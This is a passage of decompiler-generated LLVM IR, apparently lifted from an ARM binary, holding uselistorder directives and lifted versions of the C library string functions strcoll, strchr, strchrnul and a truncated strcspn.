  uselistorder i32 %v6_1729c, { 1, 0 }
  uselistorder i32 %v2_17294, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_17294, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_172a4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17288, { 0, 2, 1 }
  uselistorder i32 %v13_17284, { 1, 0 }
  uselistorder i32 %v4_17280, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_17280, { 2, 0, 1 }
  uselistorder i32 %v6_17288, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17278, { 0, 2, 1 }
  uselistorder i32 %v16_17274, { 1, 0 }
  uselistorder i32 %v4_17270, { 1, 2, 0 }
  uselistorder i32 %v0_17280.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17278, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17264, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17260, { 1, 0 }
  uselistorder i32 %v1_1725c, { 1, 0 }
  uselistorder i32 %v10_17258, { 1, 0 }
  uselistorder i32 %v0_17258, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1725c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17250, { 0, 2, 1 }
  uselistorder i32 %v2_17244, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17244, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1725c37, { 1, 2, 0 }
  uselistorder i32 %v1_1723c, { 2, 1, 0 }
  uselistorder i32 %v1_17234, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1722c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17228, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_17224, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_17224, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_17214, { 0, 2, 1 }
  uselistorder i32 %v4_17210, { 1, 0 }
  uselistorder i32 %v3_17204, { 1, 0 }
  uselistorder i32 %v1_171fc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_171f0, { 1, 0 }
  uselistorder i32 %v12_171ec, { 0, 2, 1 }
  uselistorder i32 %v8_171cc, { 1, 0, 2 }
  uselistorder i32 %v5_171cc, { 1, 0, 2 }
  uselistorder i32 %v2_171cc, { 1, 0, 2 }
  uselistorder i32 %v0_171cc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_171ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_171a8, { 0, 2, 1 }
  uselistorder i32 %v4_171a4, { 1, 0 }
  uselistorder i32 %v3_17198, { 1, 0 }
  uselistorder i32 %v1_17190, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17184, { 1, 0 }
  uselistorder i32 %v12_17180, { 0, 2, 1 }
  uselistorder i32 %v8_17160, { 1, 0, 2 }
  uselistorder i32 %v5_17160, { 1, 0, 2 }
  uselistorder i32 %v2_17160, { 1, 0, 2 }
  uselistorder i32 %v0_17160, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17180, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1713c, { 0, 2, 1 }
  uselistorder i32 %v4_17138, { 1, 0 }
  uselistorder i32 %v3_1712c, { 1, 0 }
  uselistorder i32 %v1_17124, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17118, { 1, 0 }
  uselistorder i32 %v12_17114, { 0, 2, 1 }
  uselistorder i32 %v8_170f4, { 1, 0, 2 }
  uselistorder i32 %v5_170f4, { 1, 0, 2 }
  uselistorder i32 %v2_170f4, { 1, 0, 2 }
  uselistorder i32 %v0_170f4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17114, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_17150, { 0, 2, 1 }
  uselistorder i32 %v1_1714c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_170d0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_170d0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17154, { 1, 0, 3, 2 }
  uselistorder i32 %v0_171ec76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_170c4, { 1, 0 }
  uselistorder i32 %v0_170c4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_170bc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_170bc, { 1, 0, 2 }
  uselistorder i32 %v0_170bc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_171ec77, { 1, 0 }
  uselistorder i32 %v1_1709c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_170a4, { 1, 0 }
  uselistorder i32 %v0_17078, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1706c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_17058, { 1, 0, 2 }
  uselistorder i32 %v1_17054, { 1, 0 }
  uselistorder i32 %v1_1704c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1704c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17044, { 0, 2, 1 }
  uselistorder i32 %v3_17044, { 3, 0, 1, 2 }
  uselistorder i1 %v0_17044, { 1, 0 }
  uselistorder i1 %v1_17044, { 1, 0 }
  uselistorder i32 %v3_17040, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17038, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17024, { 1, 2, 0 }
  uselistorder i32 %v1_1701c, { 0, 2, 1 }
  uselistorder i32 %v12_17018, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1700c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17010, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_17000, { 0, 2, 1 }
  uselistorder i32 %v1_16ff8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16ff8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16ff0, { 1, 0 }
  uselistorder i32 %v1_16fe8, { 2, 1, 0 }
  uselistorder i32 %v2_16fe0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16fe0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_16fdc, { 1, 0 }
  uselistorder i32 %v2_16fd0, { 1, 0 }
  uselistorder i32 %v1_16fd0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16fd0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_17440, { 2, 0, 1 }
  uselistorder label %dec_label_pc_173d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17308, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_17294, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17258, { 1, 0 }
  uselistorder label %dec_label_pc_17244, { 1, 0 }
  uselistorder label %dec_label_pc_17204, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17198, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1712c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170cc, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1709c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_17038, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16ff8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17464.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_17464 = phi i32 [ %v0_17464.pre, %bb ], [ %v5_17464, %bb3 ]
  %v0_17460 = phi i32 [ %tmp, %bb ], [ %v5_17460, %bb3 ]
  %v1_17460 = inttoptr i32 %v0_17460 to i8*
  %v2_17460 = load i8, i8* %v1_17460, align 1
  %v1_17464 = inttoptr i32 %v0_17464 to i8*
  %v2_17464 = load i8, i8* %v1_17464, align 1
  %v3_17464 = zext i8 %v2_17464 to i32
  %v2_17468 = icmp eq i8 %v2_17460, 0
  br i1 %v2_17468, label %.dec_label_pc_17474_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_17464 = add i32 %v0_17464, 1
  %v5_17460 = add i32 %v0_17460, 1
  %v3_17460 = zext i8 %v2_17460 to i32
  %v10_1746c = icmp eq i8 %v2_17460, %v2_17464
  br i1 %v10_1746c, label %entry, label %dec_label_pc_17474

.dec_label_pc_17474_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %bb3, %.dec_label_pc_17474_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17474_crit_edge ], [ %v3_17460, %bb3 ]
  %v2_17474.pre-phi = sub nsw i32 %.pn, %v3_17464
  ret i32 %v2_17474.pre-phi

; uselistorder directives
  uselistorder i8 %v2_17460, { 0, 2, 1 }
  uselistorder i32 %v0_17460, { 1, 0 }
  uselistorder i32 %v0_17464, { 1, 0 }
  uselistorder label %dec_label_pc_17474, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_174e4 = urem i32 %arg1, 256
  %v0_175043 = load i32, i32* @r0, align 4
  %v1_175044 = urem i32 %v0_175043, 4
  %v2_175045 = icmp eq i32 %v1_175044, 0
  br i1 %v2_175045, label %dec_label_pc_1750c, label %dec_label_pc_174ec

dec_label_pc_174ec:                               ; preds = %entry, %dec_label_pc_17500
  %v0_17500 = phi i32 [ %v1_17500, %dec_label_pc_17500 ], [ %v0_175043, %entry ]
  %v1_174ec = inttoptr i32 %v0_17500 to i8*
  %v2_174ec = load i8, i8* %v1_174ec, align 1
  %v3_174ec = zext i8 %v2_174ec to i32
  %v9_174f0 = icmp eq i32 %v3_174ec, %v1_174e4
  br i1 %v9_174f0, label %dec_label_pc_175c0, label %dec_label_pc_174f8

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174ec
  %v2_174f8 = icmp eq i8 %v2_174ec, 0
  br i1 %v2_174f8, label %dec_label_pc_175bc, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f8
  %v1_17500 = add i32 %v0_17500, 1
  %v1_17504 = urem i32 %v1_17500, 4
  %v2_17504 = icmp eq i32 %v1_17504, 0
  br i1 %v2_17504, label %dec_label_pc_1750c, label %dec_label_pc_174ec

dec_label_pc_1750c:                               ; preds = %dec_label_pc_17500, %entry
  %v0_17510 = phi i32 [ %v0_175043, %entry ], [ %v1_17500, %dec_label_pc_17500 ]
  %v4_1750c = mul nuw nsw i32 %v1_174e4, 256
  %v5_1750c = or i32 %v4_1750c, %v1_174e4
  %v4_17514 = mul i32 %v5_1750c, 65536
  %v5_17514 = or i32 %v4_17514, %v5_1750c
  br label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_175b4, %dec_label_pc_17554, %dec_label_pc_1750c
  %v0_1757c = phi i32 [ %v0_17510, %dec_label_pc_1750c ], [ %v4_17518, %dec_label_pc_17554 ], [ %v4_17518, %dec_label_pc_175b4 ]
  %v1_17518 = inttoptr i32 %v0_1757c to i32*
  %v2_17518 = load i32, i32* %v1_17518, align 4
  %v4_17518 = add i32 %v0_1757c, 4
  %v2_17520 = xor i32 %v2_17518, %v5_17514
  %v2_1752c = add i32 %v2_17518, 2130640639
  %v1_17530 = sub i32 -1, %v2_17518
  %v2_17534 = xor i32 %v2_1752c, %v1_17530
  %v2_17540 = and i32 %v2_17534, -2130640640
  store i32 %v2_17540, i32* @r1, align 4
  %v2_17548 = icmp eq i32 %v2_17540, 0
  br i1 %v2_17548, label %dec_label_pc_17554, label %dec_label_pc_1755c

dec_label_pc_17554:                               ; preds = %dec_label_pc_17518
  %v2_17524 = add i32 %v2_17520, 2130640639
  %v1_1753c = sub i32 -1, %v2_17520
  %v2_17544 = xor i32 %v2_17524, %v1_1753c
  %v2_1754c = and i32 %v2_17544, -2130640640
  %v2_17554 = icmp eq i32 %v2_1754c, 0
  br i1 %v2_17554, label %dec_label_pc_17518, label %dec_label_pc_1755c

dec_label_pc_1755c:                               ; preds = %dec_label_pc_17518, %dec_label_pc_17554
  %v2_1755c = inttoptr i32 %v0_1757c to i8*
  %v3_1755c = load i8, i8* %v2_1755c, align 1
  %v4_1755c = zext i8 %v3_1755c to i32
  %v9_17560 = icmp eq i32 %v4_1755c, %v1_174e4
  br i1 %v9_17560, label %dec_label_pc_175c0, label %dec_label_pc_1756c

dec_label_pc_1756c:                               ; preds = %dec_label_pc_1755c
  %v2_1756c = icmp eq i8 %v3_1755c, 0
  br i1 %v2_1756c, label %dec_label_pc_175bc, label %dec_label_pc_17574

dec_label_pc_17574:                               ; preds = %dec_label_pc_1756c
  %v1_17574 = add i32 %v0_1757c, 1
  %v2_17574 = inttoptr i32 %v1_17574 to i8*
  %v3_17574 = load i8, i8* %v2_17574, align 1
  %v4_17574 = zext i8 %v3_17574 to i32
  %v9_17578 = icmp eq i32 %v4_17574, %v1_174e4
  br i1 %v9_17578, label %dec_label_pc_175c0, label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_17574
  %v2_17584 = icmp eq i8 %v3_17574, 0
  br i1 %v2_17584, label %dec_label_pc_175bc, label %dec_label_pc_1758c

dec_label_pc_1758c:                               ; preds = %dec_label_pc_17584
  %v1_1758c = add i32 %v0_1757c, 2
  %v2_1758c = inttoptr i32 %v1_1758c to i8*
  %v3_1758c = load i8, i8* %v2_1758c, align 1
  %v4_1758c = zext i8 %v3_1758c to i32
  %v9_17590 = icmp eq i32 %v4_1758c, %v1_174e4
  br i1 %v9_17590, label %dec_label_pc_175c0, label %dec_label_pc_1759c

dec_label_pc_1759c:                               ; preds = %dec_label_pc_1758c
  %v2_1759c = icmp eq i8 %v3_1758c, 0
  br i1 %v2_1759c, label %dec_label_pc_175bc, label %dec_label_pc_175a4

dec_label_pc_175a4:                               ; preds = %dec_label_pc_1759c
  %v1_175a4 = add i32 %v0_1757c, 3
  %v2_175a4 = inttoptr i32 %v1_175a4 to i8*
  %v3_175a4 = load i8, i8* %v2_175a4, align 1
  %v4_175a4 = zext i8 %v3_175a4 to i32
  %v9_175a8 = icmp eq i32 %v4_175a4, %v1_174e4
  br i1 %v9_175a8, label %dec_label_pc_175c0, label %dec_label_pc_175b4

dec_label_pc_175b4:                               ; preds = %dec_label_pc_175a4
  %v2_175b4 = icmp eq i8 %v3_175a4, 0
  br i1 %v2_175b4, label %dec_label_pc_175bc, label %dec_label_pc_17518

dec_label_pc_175bc:                               ; preds = %dec_label_pc_174f8, %dec_label_pc_175b4, %dec_label_pc_1759c, %dec_label_pc_17584, %dec_label_pc_1756c
  br label %dec_label_pc_175c0

dec_label_pc_175c0:                               ; preds = %dec_label_pc_174ec, %dec_label_pc_175a4, %dec_label_pc_1758c, %dec_label_pc_17574, %dec_label_pc_1755c, %dec_label_pc_175bc
  %v1_175c4 = phi i32 [ 0, %dec_label_pc_175bc ], [ %v1_175a4, %dec_label_pc_175a4 ], [ %v1_1758c, %dec_label_pc_1758c ], [ %v1_17574, %dec_label_pc_17574 ], [ %v0_1757c, %dec_label_pc_1755c ], [ %v0_17500, %dec_label_pc_174ec ]
  ret i32 %v1_175c4

; uselistorder directives
  uselistorder i32 %v4_17518, { 1, 0 }
  uselistorder i32 %v2_17518, { 0, 2, 1 }
  uselistorder i32 %v0_1757c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1750c, { 1, 0 }
  uselistorder i32 %v1_17500, { 1, 0, 2 }
  uselistorder i32 %v0_175043, { 2, 1, 0 }
  uselistorder i32 %v1_174e4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_175c0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_175bc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1755c, { 1, 0 }
  uselistorder label %dec_label_pc_174ec, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_175d4 = urem i32 %arg1, 256
  %v0_175f42 = load i32, i32* @r0, align 4
  %v1_175f43 = urem i32 %v0_175f42, 4
  %v2_175f44 = icmp eq i32 %v1_175f43, 0
  br i1 %v2_175f44, label %dec_label_pc_175fc, label %dec_label_pc_175dc

dec_label_pc_175dc:                               ; preds = %entry, %dec_label_pc_175f0
  %v0_175f0 = phi i32 [ %v1_175f0, %dec_label_pc_175f0 ], [ %v0_175f42, %entry ]
  %v1_175dc = inttoptr i32 %v0_175f0 to i8*
  %v2_175dc = load i8, i8* %v1_175dc, align 1
  %v3_175dc = zext i8 %v2_175dc to i32
  %v9_175e0 = icmp eq i32 %v3_175dc, %v1_175d4
  br i1 %v9_175e0, label %dec_label_pc_176ac, label %dec_label_pc_175e8

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175dc
  %v2_175e8 = icmp eq i8 %v2_175dc, 0
  br i1 %v2_175e8, label %dec_label_pc_176ac, label %dec_label_pc_175f0

dec_label_pc_175f0:                               ; preds = %dec_label_pc_175e8
  %v1_175f0 = add i32 %v0_175f0, 1
  %v1_175f4 = urem i32 %v1_175f0, 4
  %v2_175f4 = icmp eq i32 %v1_175f4, 0
  br i1 %v2_175f4, label %dec_label_pc_175fc, label %dec_label_pc_175dc

dec_label_pc_175fc:                               ; preds = %dec_label_pc_175f0, %entry
  %v0_17600 = phi i32 [ %v0_175f42, %entry ], [ %v1_175f0, %dec_label_pc_175f0 ]
  %v4_175fc = mul nuw nsw i32 %v1_175d4, 256
  %v5_175fc = or i32 %v4_175fc, %v1_175d4
  %v4_17604 = mul i32 %v5_175fc, 65536
  %v5_17604 = or i32 %v4_17604, %v5_175fc
  br label %dec_label_pc_17608

dec_label_pc_17608:                               ; preds = %dec_label_pc_176a4, %dec_label_pc_17644, %dec_label_pc_175fc
  %v0_1766c = phi i32 [ %v0_17600, %dec_label_pc_175fc ], [ %v4_17608, %dec_label_pc_17644 ], [ %v4_17608, %dec_label_pc_176a4 ]
  %v1_17608 = inttoptr i32 %v0_1766c to i32*
  %v2_17608 = load i32, i32* %v1_17608, align 4
  %v4_17608 = add i32 %v0_1766c, 4
  %v2_17610 = xor i32 %v2_17608, %v5_17604
  %v2_1761c = add i32 %v2_17608, 2130640639
  %v1_17620 = sub i32 -1, %v2_17608
  %v2_17624 = xor i32 %v2_1761c, %v1_17620
  %v2_17630 = and i32 %v2_17624, -2130640640
  store i32 %v2_17630, i32* @r1, align 4
  %v2_17638 = icmp eq i32 %v2_17630, 0
  br i1 %v2_17638, label %dec_label_pc_17644, label %dec_label_pc_1764c

dec_label_pc_17644:                               ; preds = %dec_label_pc_17608
  %v2_17614 = add i32 %v2_17610, 2130640639
  %v1_1762c = sub i32 -1, %v2_17610
  %v2_17634 = xor i32 %v2_17614, %v1_1762c
  %v2_1763c = and i32 %v2_17634, -2130640640
  %v2_17644 = icmp eq i32 %v2_1763c, 0
  br i1 %v2_17644, label %dec_label_pc_17608, label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17608, %dec_label_pc_17644
  %v2_1764c = inttoptr i32 %v0_1766c to i8*
  %v3_1764c = load i8, i8* %v2_1764c, align 1
  %v4_1764c = zext i8 %v3_1764c to i32
  %v9_17650 = icmp eq i32 %v4_1764c, %v1_175d4
  br i1 %v9_17650, label %dec_label_pc_176ac, label %dec_label_pc_1765c

dec_label_pc_1765c:                               ; preds = %dec_label_pc_1764c
  %v2_1765c = icmp eq i8 %v3_1764c, 0
  br i1 %v2_1765c, label %dec_label_pc_176ac, label %dec_label_pc_17664

dec_label_pc_17664:                               ; preds = %dec_label_pc_1765c
  %v1_17664 = add i32 %v0_1766c, 1
  %v2_17664 = inttoptr i32 %v1_17664 to i8*
  %v3_17664 = load i8, i8* %v2_17664, align 1
  %v4_17664 = zext i8 %v3_17664 to i32
  %v9_17668 = icmp eq i32 %v4_17664, %v1_175d4
  br i1 %v9_17668, label %dec_label_pc_176ac, label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %dec_label_pc_17664
  %v2_17674 = icmp eq i8 %v3_17664, 0
  br i1 %v2_17674, label %dec_label_pc_176ac, label %dec_label_pc_1767c

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17674
  %v1_1767c = add i32 %v0_1766c, 2
  %v2_1767c = inttoptr i32 %v1_1767c to i8*
  %v3_1767c = load i8, i8* %v2_1767c, align 1
  %v4_1767c = zext i8 %v3_1767c to i32
  %v9_17680 = icmp eq i32 %v4_1767c, %v1_175d4
  br i1 %v9_17680, label %dec_label_pc_176ac, label %dec_label_pc_1768c

dec_label_pc_1768c:                               ; preds = %dec_label_pc_1767c
  %v2_1768c = icmp eq i8 %v3_1767c, 0
  br i1 %v2_1768c, label %dec_label_pc_176ac, label %dec_label_pc_17694

dec_label_pc_17694:                               ; preds = %dec_label_pc_1768c
  %v1_17694 = add i32 %v0_1766c, 3
  %v2_17694 = inttoptr i32 %v1_17694 to i8*
  %v3_17694 = load i8, i8* %v2_17694, align 1
  %v4_17694 = zext i8 %v3_17694 to i32
  %v9_17698 = icmp eq i32 %v4_17694, %v1_175d4
  br i1 %v9_17698, label %dec_label_pc_176ac, label %dec_label_pc_176a4

dec_label_pc_176a4:                               ; preds = %dec_label_pc_17694
  %v2_176a4 = icmp eq i8 %v3_17694, 0
  br i1 %v2_176a4, label %dec_label_pc_176ac, label %dec_label_pc_17608

dec_label_pc_176ac:                               ; preds = %dec_label_pc_175e8, %dec_label_pc_175dc, %dec_label_pc_176a4, %dec_label_pc_17694, %dec_label_pc_1768c, %dec_label_pc_1767c, %dec_label_pc_17674, %dec_label_pc_17664, %dec_label_pc_1765c, %dec_label_pc_1764c
  %v1_176b0 = phi i32 [ %v1_17694, %dec_label_pc_176a4 ], [ %v1_17694, %dec_label_pc_17694 ], [ %v1_1767c, %dec_label_pc_1768c ], [ %v1_1767c, %dec_label_pc_1767c ], [ %v1_17664, %dec_label_pc_17674 ], [ %v1_17664, %dec_label_pc_17664 ], [ %v0_1766c, %dec_label_pc_1765c ], [ %v0_1766c, %dec_label_pc_1764c ], [ %v0_175f0, %dec_label_pc_175dc ], [ %v0_175f0, %dec_label_pc_175e8 ]
  ret i32 %v1_176b0

; uselistorder directives
  uselistorder i32 %v4_17608, { 1, 0 }
  uselistorder i32 %v2_17608, { 0, 2, 1 }
  uselistorder i32 %v0_1766c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_175fc, { 1, 0 }
  uselistorder i32 %v1_175f0, { 1, 0, 2 }
  uselistorder i32 %v0_175f42, { 2, 1, 0 }
  uselistorder i32 %v1_175d4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_176ac, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1764c, { 1, 0 }
  uselistorder label %dec_label_pc_175dc, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_176bc = load i32, i32* @r4, align 4
  store i32 %v3_176bc, i32* %stack_var_-16, align 4
  %v6_176bc = load i32, i32* @r5, align 4
  %v9_176bc = load i32, i32* @r6, align 4
  %v0_176c0 = load i32, i32* @r0, align 4
  %v0_176c4 = load i32, i32* @r1, align 4
  store i32 %v0_176c4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_176e08 = inttoptr i32 %v0_176c0 to i8*
  %v2_176e09 = load i8, i8* %v1_176e08, align 1
  %v3_176e010 = zext i8 %v2_176e09 to i32
  store i32 %v3_176e010, i32* @r1, align 4
  %v2_176e411 = icmp eq i8 %v2_176e09, 0
  store i32 %v0_176c4, i32* @r0, align 4
  %v1_176ec12 = add i32 %v0_176c0, 1
  store i32 %v1_176ec12, i32* @r4, align 4
  br i1 %v2_176e411, label %dec_label_pc_176f4, label %dec_label_pc_176d0

dec_label_pc_176d0:                               ; preds = %entry, %dec_label_pc_176dc
  %v3_176e014 = phi i32 [ %v3_176e0, %dec_label_pc_176dc ], [ %v3_176e010, %entry ]
  %v0_176e813 = phi i32 [ %v0_176e8.pre, %dec_label_pc_176dc ], [ %v0_176c4, %entry ]
  %v2_176d0 = call i32 @__GI_strchr(i32 %v0_176e813, i32 %v3_176e014)
  %v2_176d4 = icmp eq i32 %v2_176d0, 0
  %v0_176dc = load i32, i32* @r5, align 4
  br i1 %v2_176d4, label %dec_label_pc_176dc, label %dec_label_pc_176f4

dec_label_pc_176dc:                               ; preds = %dec_label_pc_176d0
  %v1_176dc = add i32 %v0_176dc, 1
  %v0_176e0.pre = load i32, i32* @r4, align 4
  %v0_176e8.pre = load i32, i32* @r6, align 4
  store i32 %v1_176dc, i32* @r5, align 4
  %v1_176e0 = inttoptr i32 %v0_176e0.pre to i8*
  %v2_176e0 = load i8, i8* %v1_176e0, align 1
  %v3_176e0 = zext i8 %v2_176e0 to i32
  store i32 %v3_176e0, i32* @r1, align 4
  %v2_176e4 = icmp eq i8 %v2_176e0, 0
  store i32 %v0_176e8.pre, i32* @r0, align 4
  %v1_176ec = add i32 %v0_176e0.pre, 1
